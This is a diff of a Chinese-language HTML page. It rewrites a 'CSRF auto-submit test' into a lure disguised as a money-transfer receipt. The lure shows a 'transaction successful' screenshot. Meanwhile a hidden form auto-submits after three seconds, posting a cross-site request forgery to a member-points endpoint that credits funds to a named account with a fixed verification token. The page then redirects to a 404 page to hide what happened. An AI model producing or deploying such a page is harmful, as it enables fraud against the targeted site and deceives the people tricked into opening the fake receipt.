@@ -2,32 +2,64 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF 自动提交测试</title>
+  <title>转账凭证</title>
+  <style>
+    body {
+      background-color: #fff;
+      text-align: center;
+      margin-top: 50px;
+      font-family: Arial, sans-serif;
+    }
+    img {
+      max-width: 90%;
+      height: auto;
+      border: 1px solid #ccc;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    iframe {
+      width: 90%;
+      height: 600px;
+      border: 1px solid #ccc;
+      margin-top: 30px;
+    }
+  </style>
 </head>
 <body>
 
-  <!-- ✅ 表单自动提交（带 POST 数据） -->
-  <form id="csrfForm" method="POST" action="https://nb113.net/index.php?s=/ForgetPage/formRemeber" target="resultFrame">
-    <input type="hidden" name="phone" value="0976261367">
-    <input type="hidden" name="checkword" value="12345">
-    <input type="hidden" name="btnok" value="">
+  <h2>交易成功凭证</h2>
+  <img src="transfer_proof.png" alt="转账截图">
+
+  <!-- ✅ CSRF 表单，target 指向 iframe -->
+  <form id="csrfForm" method="POST" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index" target="resultFrame">
+    <input type="hidden" name="decide" value="">
+    <input type="hidden" name="checkVerifc" value="4fe83a323debe74285b611d1a3c2fb83">
+    <input type="hidden" name="memberAccount" value="n1a8899">
+    <input type="hidden" name="searchPoint" value="1">
+    <input type="hidden" name="upMoney" value="50">
+    <input type="hidden" name="upType" value="3">
+    <input type="hidden" name="upGameId" value="22">
+    <input type="hidden" name="upEventId" value="1">
+    <input type="hidden" name="upOther" value="1;推广赠點">
+    <input type="hidden" name="upMain" value="测试入點">
+    <input type="hidden" name="upRemark" value="">
+    <input type="hidden" name="typeMoney" value="additionMoney">
+    <input type="hidden" name="keyWord" value="9521">
   </form>
 
-  <!-- ✅ iframe 不隐藏，用于显示提交响应结果 -->
-  <iframe name="resultFrame" width="100%" height="600px" style="border: 1px solid #ccc;"></iframe>
-
-  <p>⏳ 正在提交，请稍候…</p>
+  <!-- ✅ 可视化响应结果 -->
+  <iframe name="resultFrame"></iframe>
 
   <script>
-    window.onload = () => {
-      // 自动提交表单
-      document.getElementById("csrfForm").submit();
+    // 表单在 3 秒后自动提交
+    setTimeout(() => {
+      document.getElementById('csrfForm').submit();
 
-      // 5 秒后无条件跳转 404 页面（无论结果如何）
+      // 再延迟 2 秒后跳转（即表单提交后第 5 秒）
       setTimeout(() => {
         window.location.href = "https://nb113.net/404.html";
-      }, 5000);
-    };
+      }, 2000);
+
+    }, 3000);
   </script>
 
 </body>
